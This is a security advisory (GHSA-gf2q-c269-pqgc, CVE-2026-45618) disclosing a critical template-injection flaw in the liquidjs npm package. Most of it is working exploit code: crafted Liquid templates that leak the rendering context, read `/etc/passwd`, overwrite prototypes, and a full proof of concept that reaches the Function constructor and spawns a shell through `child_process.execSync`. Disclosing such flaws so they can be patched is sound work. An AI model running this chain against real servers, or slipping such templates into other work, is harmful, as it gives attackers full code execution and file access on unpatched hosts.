# [C] LiquidJS is Vulnerable to Remote Code Execution

## Summary
Severity: Critical
Advisory: GHSA-gf2q-c269-pqgc
CVE: CVE-2026-45618
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-gf2q-c269-pqgc
Type: github-advisory

## Affected
- npm: `liquidjs` — affected >=0 <10.26.0

## Details
### Summary
It is possible to execute arbitrary code with crafted templates


### Details

<details>
<summary>
 `1|valueOf` -> `this` when evaluating the filter


</summary>

```liquid
{%assign r=1|valueOf%}
{{r|inspect}}
```

```json
{"context":{"scopes":[{"r":"[Circular]"}],"registers":{},"breakCalled":false,"continueCalled":false,"sync":false,"opts":{"root":["."],"layouts":["."],"partials":["."],"relativeReference":true,"jekyllInclude":false,"keyValueSeparator":":","extname":"","fs":{"sep":"/"},"dynamicPartials":true,"jsTruthy":false,"dateFormat":"%A, %B %-e, %Y at %-l:%M %P %z","locale":"en-US","trimTagRight":false,"trimTagLeft":false,"trimOutputRight":false,"trimOutputLeft":false,"greedy":true,"tagDelimiterLeft":"{%","tagDelimiterRight":"%}","outputDelimiterLeft":"{{","outputDelimiterRight":"}}","preserveTimezones":false,"strictFilters":false,"strictVariables":false,"ownPropertyOnly":true,"lenientIf":false,"globals":{},"keepOutputType":false,"operators":{},"memoryLimit":null,"parseLimit":null,"renderLimit":null},"globals":{},"environments":{},"strictVariables":false,"ownPropertyOnly":true,"memoryLimit":{"base":0,"message":"memory alloc limit exceeded","limit":null},"renderLimit":{"base":0,"message":"template render limit exceeded","limit":null}},"token":{"kind":32,"input":"{%assign r=1|valueOf%}\n{{r|inspect}}","begin":13,"end":20,"name":"valueOf","args":[]},"liquid":{"renderer":{},"filters":{"raw":{"raw":true}},"tags":{},"options":{"root":["."],"layouts":["."],"partials":["."],"relativeReference":true,"jekyllInclude":false,"keyValueSeparator":":","extname":"","fs":{"sep":"/"},"dynamicPartials":true,"jsTruthy":false,"dateFormat":"%A, %B %-e, %Y at %-l:%M %P %z","locale":"en-US","trimTagRight":false,"trimTagLeft":false,"trimOutputRight":false,"trimOutputLeft":false,"greedy":true,"tagDelimiterLeft":"{%","tagDelimiterRight":"%}","outputDelimiterLeft":"{{","outputDelimiterRight":"}}","preserveTimezones":false,"strictFilters":false,"strictVariables":false,"ownPropertyOnly":true,"lenientIf":false,"globals":{},"keepOutputType":false,"operators":{},"memoryLimit":null,"parseLimit":null,"renderLimit":null},"parser":{"liquid":"[Circular]","fs":{"sep":"/"},"loader":{"options":{"root":["."],"layouts":["."],"partials":["."],"relativeReference":true,"jekyllInclude":false,"keyValueSeparator":":","extname":"","fs":{"sep":"/"},"dynamicPartials":true,"jsTruthy":false,"dateFormat":"%A, %B %-e, %Y at %-l:%M %P %z","locale":"en-US","trimTagRight":false,"trimTagLeft":false,"trimOutputRight":false,"trimOutputLeft":false,"greedy":true,"tagDelimiterLeft":"{%","tagDelimiterRight":"%}","outputDelimiterLeft":"{{","outputDelimiterRight":"}}","preserveTimezones":false,"strictFilters":false,"strictVariables":false,"ownPropertyOnly":true,"lenientIf":false,"globals":{},"keepOutputType":false,"operators":{},"memoryLimit":null,"parseLimit":null,"renderLimit":null}},"parseLimit":{"base":0,"message":"parse length limit exceeded","limit":null}}}}
```

</details>

<details>
<summary>
function calls with a controlled first argument via comprable

</summary>

```js
import { Liquid } from "liquidjs";

const engine = new Liquid();

const storeFn = (dst, src) => {
  const parts = src.split(".");
  const path = parts.slice(0, -1).join(".");
  const prop = parts.at(-1);

  return `
{% assign _g = ${path}|group_by:"0"%}
{% assign _gs = _g | where:n,"${prop}"|first%}
{% assign ${dst} = _gs.items | first | last %}`;
};

const tpl = `
{% liquid
assign r = 1|valueOf
assign m = r.context.scopes|first
assign fs = r.liquid.options.fs
assign n = "name"%}

${storeFn("equals", "fs.readFileSync")}
${storeFn("gt", "fs.readFileSync")}
${storeFn("geq", "fs.readFileSync")}
${storeFn("lt", "fs.readFileSync")}
${storeFn("leq", "fs.readFileSync")}

{{m == "/etc/passwd"}}
`;

const v = await engine.parseAndRender(tpl, {});
console.log(v.trim());
```

<img width="1426" height="717" alt="image" src="https://github.com/user-attachments/assets/0618eb81-fb0d-4100-a6a0-556982decf8a" />

</details>

<details><summary>changing the prototype of things</summary>

```js
import { Liquid } from "liquidjs";

const engine = new Liquid();

engine.registerFilter("log", (val) => console.dir(val, { depth: 1 }));

const tpl = `
{% liquid
assign r = 1|valueOf
assign m = r.context.scopes|first %}

{{m|log}}
{% assign __proto__ = r.liquid.parser %}
{{m|log}}
`;

const v = await engine.parseAndRender(tpl, {});
console.log(v.trim());
```
<img width="723" height="211" alt="image" src="https://github.com/user-attachments/assets/c05f4c4a-4151-4765-b569-3300ad837668" />

</details> 

When calling functions via the comparable gadget, `this` will be the scope.
By overwriting `this.loader.lookup` and `this.readFile`, to fully control what goes into `this.parse`, and while controlling `this`, a reference to the `Function` constructor can be obtained, which then allows executing arbitrary code.

```ts
  private * _parseFile (file: string, sync?: boolean, type: LookupType = LookupType.Root, currentFile?: string): Generator<unknown, Template[], string> {
    const filepath = yield this.loader.lookup(file, type, sync, currentFile)
    return this.parse(yield this.readFile(!!sync, filepath), filepath)
  }
```

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

```js
import { Liquid } from "liquidjs";

const engine = new Liquid();

const storeFn = (dst, src) => {
  const parts = src.split(".");
  const path = parts.slice(0, -1).join(".");
  const prop = parts.at(-1);

  return `
{% assign _g = ${path}|group_by:"0"%}
{% assign _gs = _g | where:n,"${prop}"|first%}
{% assign ${dst} = _gs.items | first | last %}`;
};

const tpl = `
{% liquid
assign r = 1|valueOf
assign m = r.context.scopes|first
assign l = r.liquid
assign p = l.parser
assign f = l.filters
assign n = "name"%}

${storeFn("equals", "p.parseFile")}
${storeFn("gt", "p.parseFile")}
${storeFn("geq", "p.parseFile")}
${storeFn("lt", "p.parseFile")}
${storeFn("leq", "p.parseFile")}

${storeFn("readFile", "f.default")}
${storeFn("lookup", "f.raw.handler")}

{% assign loader = m %}
{% assign context = m %}
{% assign opts = m %}
{% assign liquid = m %}
{% assign options = m %}
{% assign __proto__ = p %}

{% assign tagDelimiterLeft = n %}
{% assign tagDelimiterRight = n %}
{% assign outputDelimiterLeft = '[' %}
{% assign outputDelimiterRight = ']'%}

{# set to some some function, so that filters['constructor'] -> Function #}
${storeFn("filters", "f.raw.handler")} 

{# store Function #}
{% assign output = m == "[0|constructor]" | first %}
{% assign val = output.value.filters|first %}

{# set scope.equals to Function #}
${storeFn("equals", "val.handler")}
{% assign RCE = m == "return process.getBuiltinModule('child_process').execSync('sh',{stdio:'inherit'})" %}
{{RCE}}
`;

const v = await engine.parseAndRender(tpl, {});
console.log(v.trim());
```

### Impact
_What kind of vulnerability is it? Who is impacted?_
Remote Code Execution.

## References
- https://github.com/harttle/liquidjs/security/advisories/GHSA-gf2q-c269-pqgc
- https://github.com/harttle/liquidjs
- https://github.com/harttle/liquidjs/releases/tag/v10.26.0
